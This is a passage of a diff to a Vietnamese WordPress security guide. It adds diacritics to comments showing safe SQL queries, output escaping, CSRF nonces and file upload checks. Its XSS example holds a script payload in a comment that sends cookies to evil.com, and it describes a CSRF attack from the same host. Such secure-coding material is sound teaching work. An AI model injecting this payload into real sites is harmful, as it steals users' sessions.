 if ( ! empty( $ids ) ) {
     $placeholders = implode( ', ', array_fill( 0, count( $ids ), '%d' ) );
@@ -636,26 +636,26 @@ if ( ! empty( $ids ) ) {
     );
 }
 
-// Cach 4: Dung $wpdb->insert(), update(), delete() (tu dong escape)
+// Cách 4: Dùng $wpdb->insert(), update(), delete() (tự động escape)
 $wpdb->insert(
     $table,
     array( 'name' => $name, 'email' => $email ),
     array( '%s', '%s' )
 );
-// Cac ham nay tu dong escape gia tri
+// Các hàm này tự động escape giá trị
 
-// Cach 5: Whitelisting cho ORDER BY, ten cot
+// Cách 5: Whitelisting cho ORDER BY, tên cột
 $allowed_columns = array( 'id', 'name', 'email', 'created_at' );
 $orderby = in_array( $_GET['orderby'] ?? '', $allowed_columns )
     ? $_GET['orderby']
-    : 'id'; // Mac dinh an toan
+    : 'id'; // Mặc định an toàn
 
 $allowed_orders = array( 'ASC', 'DESC' );
 $order = in_array( strtoupper( $_GET['order'] ?? '' ), $allowed_orders )
     ? strtoupper( $_GET['order'] )
     : 'DESC';
 
-// An toan vi orderby va order chi co the la gia tri trong whitelist
+// An toàn vì orderby và order chỉ có thể là giá trị trong whitelist
 $results = $wpdb->get_results(
     $wpdb->prepare(
         "SELECT * FROM {$table} ORDER BY {$orderby} {$order} LIMIT %d",
@@ -671,63 +671,63 @@ $results = $wpdb->get_results(
 ```php
 <?php
 /**
- * XSS (Cross-Site Scripting) la gi?
- * Ke tan cong chen JavaScript vao trang web de:
- * - Danh cap cookie/session
- * - Redirect nguoi dung
- * - Thay doi noi dung trang
+ * XSS (Cross-Site Scripting) là gì?
+ * Kẻ tấn công chèn JavaScript vào trang web để:
+ * - Đánh cắp cookie/session
+ * - Redirect người dùng
+ * - Thay đổi nội dung trang
  *
- * Phong chong: LUON escape output
+ * Phòng chống: LUÔN escape output
  */
 
 // ============================================
-// STORED XSS - Du lieu doc tu database
+// STORED XSS - Dữ liệu đọc từ database
 // ============================================
 
-// SAI - Bi XSS!
+// SAI - Bị XSS!
 $user = $wpdb->get_row( "SELECT * FROM wp_users WHERE ID = 1" );
-echo '<h1>Chao mung, ' . $user->display_name . '</h1>';
-// Neu display_name = "<script>document.location='http://evil.com?cookie='+document.cookie</script>"
-// => Cookie bi danh cap!
+echo '<h1>Chào mừng, ' . $user->display_name . '</h1>';
+// Nếu display_name = "<script>document.location='http://evil.com?cookie='+document.cookie</script>"
+// => Cookie bị đánh cắp!
 
 // DUNG
-echo '<h1>Chao mung, ' . esc_html( $user->display_name ) . '</h1>';
+echo '<h1>Chào mừng, ' . esc_html( $user->display_name ) . '</h1>';
 
 // ============================================
-// REFLECTED XSS - Du lieu tu URL
+// REFLECTED XSS - Dữ liệu từ URL
 // ============================================
 
 // SAI
-echo '<p>Ket qua tim kiem: ' . $_GET['s'] . '</p>';
+echo '<p>Kết quả tìm kiếm: ' . $_GET['s'] . '</p>';
 // URL: ?s=<script>alert('XSS')</script>
 
 // DUNG
-echo '<p>Ket qua tim kiem: ' . esc_html( sanitize_text_field( $_GET['s'] ) ) . '</p>';
+echo '<p>Kết quả tìm kiếm: ' . esc_html( sanitize_text_field( $_GET['s'] ) ) . '</p>';
 
 // ============================================
-// VI DU TONG HOP
+// VÍ DỤ TỔNG HỢP
 // ============================================
 
-// Hien thi du lieu trong HTML
+// Hiển thị dữ liệu trong HTML
 echo '<div class="profile">';
 echo '  <h2>' . esc_html( $user->name ) . '</h2>';
 echo '  <p>' . esc_html( $user->bio ) . '</p>';
 echo '  <a href="' . esc_url( $user->website ) . '">' . esc_html( $user->website ) . '</a>';
 echo '</div>';
 
-// Hien thi du lieu trong attributes
+// Hiển thị dữ liệu trong attributes
 echo '<input type="text" value="' . esc_attr( $value ) . '">';
 echo '<div data-id="' . esc_attr( $item_id ) . '" title="' . esc_attr( $tooltip ) . '">';
 
-// Hien thi HTML cho phep (bai viet)
+// Hiển thị HTML cho phép (bài viết)
 echo '<div class="content">';
-echo wp_kses_post( $post_content ); // Loc HTML nguy hiem, giu HTML an toan
+echo wp_kses_post( $post_content ); // Lọc HTML nguy hiểm, giữ HTML an toàn
 echo '</div>';
 
-// JavaScript inline an toan
+// JavaScript inline an toàn
 $data = array( 'name' => $user->name, 'id' => $user->ID );
 echo '<script>var userData = ' . wp_json_encode( $data ) . ';</script>';
-// wp_json_encode tu dong escape cac ky tu nguy hiem trong JSON
+// wp_json_encode tự động escape các ký tự nguy hiểm trong JSON
 ```
 
 ---
@@ -738,14 +738,14 @@ echo '<script>var userData = ' . wp_json_encode( $data ) . ';</script>';
 <?php
 /**
  * CSRF (Cross-Site Request Forgery)
- * Ke tan cong lua nguoi dung thuc hien hanh dong khong mong muon.
+ * Kẻ tấn công lừa người dùng thực hiện hành động không mong muốn.
  *
- * Vi du tan cong:
- * Trang evil.com co form an gui POST den yoursite.com/wp-admin/...
- * Neu admin dang login va truy cap evil.com, form se tu dong gui
- * va thuc hien hanh dong tren yoursite.com!
+ * Ví dụ tấn công:
+ * Trang evil.com có form ẩn gửi POST đến yoursite.com/wp-admin/...
+ * Nếu admin đang login và truy cập evil.com, form sẽ tự động gửi
+ * và thực hiện hành động trên yoursite.com!
  *
- * Phong chong: Dung NONCE cho moi form va action
+ * Phòng chống: Dùng NONCE cho mọi form và action
  */
 
 // === TRONG FORM: wp_nonce_field ===
@@ -754,7 +754,7 @@ function render_settings_form() {
     <form method="post" action="">
         <?php wp_nonce_field( 'save_settings', '_settings_nonce' ); ?>
         <input type="text" name="option_value" value="">
-        <button type="submit" name="save">Luu</button>
+        <button type="submit" name="save">Lưu</button>
     </form>
     <?php
 }
@@ -762,17 +762,17 @@ function render_settings_form() {
 function process_settings_form() {
     if ( ! isset( $_POST['save'] ) ) return;
 
-    // Kiem tra CSRF nonce
+    // Kiểm tra CSRF nonce
     if ( ! wp_verify_nonce( $_POST['_settings_nonce'] ?? '', 'save_settings' ) ) {
-        wp_die( 'CSRF check that bai! Request khong hop le.' );
+        wp_die( 'CSRF check thất bại! Request không hợp lệ.' );
     }
 
-    // Kiem tra quyen
+    // Kiểm tra quyền
     if ( ! current_user_can( 'manage_options' ) ) {
-        wp_die( 'Khong co quyen.' );
+        wp_die( 'Không có quyền.' );
     }
 
-    // An toan de xu ly
+    // An toàn để xử lý
     $value = sanitize_text_field( $_POST['option_value'] );
     update_option( 'my_option', $value );
 }
@@ -784,24 +784,24 @@ $delete_link = wp_nonce_url(
     '_delete_nonce'
 );
 echo '<a href="' . esc_url( $delete_link ) . '"
-       onclick="return confirm(\'Ban co chac muon xoa?\')">Xoa</a>';
+       onclick="return confirm(\'Bạn có chắc muốn xóa?\')">Xóa</a>';
 
-// Xu ly delete
+// Xử lý delete
 if ( isset( $_GET['action'] ) && $_GET['action'] === 'delete' ) {
     $id = absint( $_GET['id'] );
-    // Kiem tra nonce (tu dong die neu sai)
+    // Kiểm tra nonce (tự động die nếu sai)
     check_admin_referer( 'delete_item_' . $id, '_delete_nonce' );
-    // An toan de xoa
+    // An toàn để xóa
 }
 
 // === TRONG AJAX ===
-// Tao: wp_create_nonce('my_nonce') => gui sang JS
-// Kiem tra: check_ajax_referer('my_nonce', 'security')
+// Tạo: wp_create_nonce('my_nonce') => gửi sang JS
+// Kiểm tra: check_ajax_referer('my_nonce', 'security')
 
 // === TRONG REST API ===
 // Nonce: X-WP-Nonce header
-// Tao: wp_create_nonce('wp_rest')
-// WordPress tu dong kiem tra khi dung cookie auth
+// Tạo: wp_create_nonce('wp_rest')
+// WordPress tự động kiểm tra khi dùng cookie auth
 ```
 
 ---
@@ -811,34 +811,34 @@ if ( isset( $_GET['action'] ) && $_GET['action'] === 'delete' ) {
 ```php
 <?php
 /**
- * Upload file an toan trong WordPress plugin.
- * Can kiem tra: loai file, kich thuoc, ten file, quyen.
+ * Upload file an toàn trong WordPress plugin.
+ * Cần kiểm tra: loại file, kích thước, tên file, quyền.
  */
 
 function handle_secure_upload() {
-    // 1. Kiem tra quyen
+    // 1. Kiểm tra quyền
     if ( ! current_user_can( 'upload_files' ) ) {
-        wp_die( 'Khong co quyen upload.' );
+        wp_die( 'Không có quyền upload.' );
     }
 
-    // 2. Kiem tra nonce
+    // 2. Kiểm tra nonce
     check_admin_referer( 'my_upload_action', 'upload_nonce' );
 
-    // 3. Kiem tra co file khong
+    // 3. Kiểm tra có file không
     if ( empty( $_FILES['my_file'] ) || $_FILES['my_file']['error'] !== UPLOAD_ERR_OK ) {
-        wp_die( 'Khong co file hoac loi upload.' );
+        wp_die( 'Không có file hoặc lỗi upload.' );
     }
 
     $file = $_FILES['my_file'];
 
-    // 4. Kiem tra kich thuoc (5MB max)
+    // 4. Kiểm tra kích thước (5MB max)
     $max_size = 5 * 1024 * 1024; // 5MB
     if ( $file['size'] > $max_size ) {
-        wp_die( 'File qua lon. Toi da 5MB.' );
+        wp_die( 'File quá lớn. Tối đa 5MB.' );
     }
 
-    // 5. Kiem tra loai file (MIME type)
-    // QUAN TRONG: Khong tin $_FILES['type'] - do client gui, co the gia mao!
+    // 5. Kiểm tra loại file (MIME type)
+    // QUAN TRỌNG: Không tin $_FILES['type'] - do client gửi, có thể giả mạo!
     $allowed_types = array(
         'image/jpeg' => 'jpg',
         'image/png'  => 'png',
@@ -846,31 +846,31 @@ function handle_secure_upload() {
         'application/pdf' => 'pdf',
     );
 
-    // Dung wp_check_filetype de kiem tra thuc su
+    // Dùng wp_check_filetype để kiểm tra thực sự
     $file_info = wp_check_filetype( $file['name'], $allowed_types );
 
     if ( empty( $file_info['ext'] ) || empty( $file_info['type'] ) ) {
-        wp_die( 'Loai file khong duoc phep. Chi chap nhan: JPG, PNG, GIF, PDF.' );
+        wp_die( 'Loại file không được phép. Chỉ chấp nhận: JPG, PNG, GIF, PDF.' );
     }
 
-    // 6. Kiem tra noi dung file (double check)
-    // Doi voi hinh anh, kiem tra bang getimagesize
+    // 6. Kiểm tra nội dung file (double check)
+    // Đối với hình ảnh, kiểm tra bằng getimagesize
     if ( strpos( $file_info['type'], 'image/' ) === 0 ) {
         $image_info = getimagesize( $file['tmp_name'] );
         if ( false === $image_info ) {
-            wp_die( 'File khong phai la hinh anh hop le.' );
+            wp_die( 'File không phải là hình ảnh hợp lệ.' );
         }
     }
 
-    // 7. Lam sach ten file
+    // 7. Làm sạch tên file
     $safe_filename = sanitize_file_name( $file['name'] );
 
-    // 8. Su dung wp_handle_upload (cach an toan nhat)
-    // Ham nay tu dong:
-    // - Kiem tra MIME type
-    // - Di chuyen file vao thu muc uploads
-    // - Tao ten file duy nhat (tranh trung)
-    // - Tra ve URL va duong dan
+    // 8. Sử dụng wp_handle_upload (cách an toàn nhất)
+    // Hàm này tự động:
+    // - Kiểm tra MIME type
+    // - Di chuyển file vào thư mục uploads
+    // - Tạo tên file duy nhất (tránh trùng)
+    // - Trả về URL và đường dẫn
 
     // Phai include file nay truoc khi dung wp_handle_upload
     if ( ! function_exists( 'wp_handle_upload' ) ) {
